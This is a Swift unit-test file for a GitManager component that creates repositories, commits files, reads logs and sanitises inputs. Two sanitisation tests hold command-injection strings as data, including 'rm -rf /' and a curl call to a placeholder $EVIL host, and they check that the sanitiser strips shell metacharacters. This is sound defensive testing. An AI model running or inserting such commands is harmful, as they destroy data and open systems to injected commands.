import Testing
import Foundation
@testable import SecondBrainMCP

@Suite("GitManager")
struct GitManagerTests {

    /// Create a temp directory for each test to avoid cross-contamination.
    private func makeTempDir() throws -> String {
        let path = NSTemporaryDirectory() + "GitManagerTests-\(UUID().uuidString)"
        try FileManager.default.createDirectory(atPath: path, withIntermediateDirectories: true)
        return path
    }

    @Test("Init creates a git repository")
    func initCreatesRepo() async throws {
        let dir = try makeTempDir()
        let git = GitManager(repoPath: dir)

        try await git.ensureRepository()

        let gitDir = dir + "/.git"
        #expect(FileManager.default.fileExists(atPath: gitDir))
    }

    @Test("Init creates .gitignore with correct content")
    func initCreatesGitignore() async throws {
        let dir = try makeTempDir()
        let git = GitManager(repoPath: dir)

        try await git.ensureRepository()

        let gitignorePath = dir + "/.gitignore"
        #expect(FileManager.default.fileExists(atPath: gitignorePath))

        let content = try String(contentsOfFile: gitignorePath, encoding: .utf8)
        #expect(content.contains(".secondbrain-mcp/"))
        #expect(content.contains("references/"))
        #expect(content.contains(".trash/"))
    }

    @Test("Commit stages files and creates a commit")
    func commitCreatesEntry() async throws {
        let dir = try makeTempDir()
        let git = GitManager(repoPath: dir)
        try await git.ensureRepository()

        // Create a test file
        let filePath = dir + "/test.md"
        try "Hello".write(toFile: filePath, atomically: true, encoding: .utf8)

        try await git.commitChange(
            files: ["test.md"],
            message: "[SecondBrainMCP] Created: test.md"
        )

        let entries = try await git.log(maxEntries: 5)
        #expect(entries.count >= 1)
        #expect(entries[0].message.contains("test.md"))
    }

    @Test("Log returns entries for a specific file")
    func logForFile() async throws {
        let dir = try makeTempDir()
        let git = GitManager(repoPath: dir)
        try await git.ensureRepository()

        let filePath = dir + "/tracked.md"
        try "v1".write(toFile: filePath, atomically: true, encoding: .utf8)
        try await git.commitChange(files: ["tracked.md"], message: "[SecondBrainMCP] Created: tracked.md")

        try "v2".write(toFile: filePath, atomically: true, encoding: .utf8)
        try await git.commitChange(files: ["tracked.md"], message: "[SecondBrainMCP] Updated: tracked.md")

        let entries = try await git.log(forFile: "tracked.md", maxEntries: 10)
        #expect(entries.count == 2)
        #expect(entries[0].message.contains("Updated"))
        #expect(entries[1].message.contains("Created"))
    }

    @Test("isDirty detects uncommitted changes")
    func isDirtyDetectsChanges() async throws {
        let dir = try makeTempDir()
        let git = GitManager(repoPath: dir)
        try await git.ensureRepository()

        // Clean right after init
        let cleanState = try await git.isDirty()
        #expect(!cleanState)

        // Create a new file — now dirty
        try "new file".write(toFile: dir + "/untracked.md", atomically: true, encoding: .utf8)
        let dirtyState = try await git.isDirty()
        #expect(dirtyState)
    }

    @Test("Snapshot on startup commits uncommitted changes")
    func snapshotOnStartup() async throws {
        let dir = try makeTempDir()
        let git = GitManager(repoPath: dir)
        try await git.ensureRepository()

        // Create an uncommitted file
        try "orphan".write(toFile: dir + "/orphan.md", atomically: true, encoding: .utf8)

        // Re-run ensure — should snapshot
        try await git.ensureRepository()

        let clean = try await git.isDirty()
        #expect(!clean)

        let entries = try await git.log(maxEntries: 5)
        let snapshotEntry = entries.first { $0.message.contains("Snapshot") }
        #expect(snapshotEntry != nil)
    }

    @Test("Sanitize commit message strips dangerous characters")
    func sanitizeMessage() {
        let dirty = "test; rm -rf / && echo \"pwned\" | curl $EVIL `whoami`"
        let clean = GitManager.sanitizeCommitMessage(dirty)

        #expect(!clean.contains(";"))
        #expect(!clean.contains("&"))
        #expect(!clean.contains("\""))
        #expect(!clean.contains("|"))
        #expect(!clean.contains("$"))
        #expect(!clean.contains("`"))
        #expect(clean.contains("rm"))  // Letters survive
    }

    @Test("Sanitize ref allows hex hashes")
    func sanitizeRef() {
        let hash = "abc123def456"
        #expect(GitManager.sanitizeRef(hash) == hash)

        let dirty = "abc123; rm -rf /"
        let clean = GitManager.sanitizeRef(dirty)
        #expect(!clean.contains(";"))
        #expect(!clean.contains(" "))
    }

    @Test("Empty file list is a no-op")
    func emptyCommitNoOp() async throws {
        let dir = try makeTempDir()
        let git = GitManager(repoPath: dir)
        try await git.ensureRepository()

        let beforeCount = try await git.log(maxEntries: 100).count
        try await git.commitChange(files: [], message: "should not happen")
        let afterCount = try await git.log(maxEntries: 100).count

        #expect(beforeCount == afterCount)
    }
}
